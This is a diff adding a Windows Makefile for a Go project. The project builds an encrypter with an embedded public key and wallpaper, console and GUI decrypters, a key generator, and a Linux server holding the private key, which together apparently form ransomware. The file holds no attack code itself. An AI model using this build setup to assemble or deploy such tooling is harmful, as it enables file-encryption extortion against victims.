@@ -1,0 +1,60 @@
+all: build
+
+.ONESHELL:
+SHELL := cmd.exe
+.SHELLFLAGS := /C
+
+PROJECT_DIR := $(subst /,\,$(CURDIR))
+BIN_DIR := $(PROJECT_DIR)\bin
+
+# ldflags
+LDFLAGS_CONSOLE := "-s -w"
+LDFLAGS_GUI     := "-H=windowsgui -s -w"
+
+requirements:
+	go mod tidy
+	rem go install -v github.com\akavel\rsrc@latest
+	rem go install -v github.com\go-bindata\go-bindata\go-bindata@latest
+
+keys:
+	cd $(PROJECT_DIR)\Keygen && go build -o $(BIN_DIR)\keygen.exe .
+
+pre-build:
+	go-bindata -pkg assets -o $(PROJECT_DIR)\assets\assets.go .\assets\public_key.pem .\assets\wallpaper.jpg
+	rsrc -manifest $(PROJECT_DIR)\assets\encrypt.manifest -ico $(PROJECT_DIR)\assets\locked.ico -o $(PROJECT_DIR)\Encrypt\encrypter.syso
+
+	go-bindata -pkg secret -o  $(PROJECT_DIR)\assets\secret\private_key.go .\assets\private_key.pem
+	rsrc -manifest $(PROJECT_DIR)\assets\decrypt.manifest -ico $(PROJECT_DIR)\assets\unlocked.ico -o $(PROJECT_DIR)\Decrypt\decrypter.syso
+
+	rsrc -manifest $(PROJECT_DIR)\assets\decryptGUI.manifest -ico $(PROJECT_DIR)\assets\unlocked.ico -o $(PROJECT_DIR)\DecryptGUI\decryptGUI.syso
+
+build: pre-build
+	cd $(PROJECT_DIR)\Encrypt && set GOOS=windows&& set GOARCH=amd64&& go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)\encrypt.exe .
+	cd $(PROJECT_DIR)\Decrypt && set GOOS=windows&& set GOARCH=amd64&& go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)\decrypt.exe .
+	cd $(PROJECT_DIR)\DecryptGUI && set GOOS=windows&& set GOARCH=amd64&& set CGO_ENABLED=1&& go build -ldflags $(LDFLAGS_GUI) -o $(BIN_DIR)\decryptGUI.exe .
+	cd $(PROJECT_DIR)\Server && set GOOS=linux&& set GOARCH=amd64&& go build -o $(BIN_DIR)\Server .
+	del $(PROJECT_DIR)\Encrypt\encrypter.syso
+	del $(PROJECT_DIR)\Decrypt\decrypter.syso
+	del $(PROJECT_DIR)\DecryptGUI\decryptGUI.syso
+
+encrypter:
+	go-bindata -pkg assets -o $(PROJECT_DIR)\assets\assets.go .\assets\public_key.pem .\assets\wallpaper.jpg
+	rsrc -manifest $(PROJECT_DIR)\assets\encrypt.manifest -ico $(PROJECT_DIR)\assets\locked.ico -o $(PROJECT_DIR)\Encrypt\encrypter.syso
+	cd $(PROJECT_DIR)\Encrypt && set GOOS=windows&& set GOARCH=amd64&& go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)\encrypt.exe .
+	del $(PROJECT_DIR)\Encrypt\encrypter.syso
+
+decrypter:
+	rsrc -manifest $(PROJECT_DIR)\assets\decrypt.manifest -ico $(PROJECT_DIR)\assets\unlocked.ico -o $(PROJECT_DIR)\Decrypt\decrypter.syso
+	cd $(PROJECT_DIR)\Decrypt && set GOOS=windows&& set GOARCH=amd64&& go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)\decrypt.exe .
+	del $(PROJECT_DIR)\Decrypt\decrypter.syso
+
+	rsrc -manifest $(PROJECT_DIR)\assets\decryptGUI.manifest -ico $(PROJECT_DIR)\assets\unlocked.ico -o $(PROJECT_DIR)\DecryptGUI\decryptGUI.syso
+	cd $(PROJECT_DIR)\DecryptGUI && set GOOS=windows&& set GOARCH=amd64&& set CGO_ENABLED=1&& go build -ldflags $(LDFLAGS_GUI) -o $(BIN_DIR)\decryptGUI.exe .
+	del $(PROJECT_DIR)\DecryptGUI\decryptGUI.syso
+
+backend:
+	go-bindata -pkg secret -o $(PROJECT_DIR)\assets\secret\private_key.go .\assets\private_key.pem
+	cd $(PROJECT_DIR)\Server && set GOOS=linux&& set GOARCH=amd64&& go build -o $(BIN_DIR)\Server .
+
+clean:
+	del $(BIN_DIR)\encrypt.exe $(BIN_DIR)\decrypt.exe $(BIN_DIR)\decryptGUI.exe $(BIN_DIR)\Server
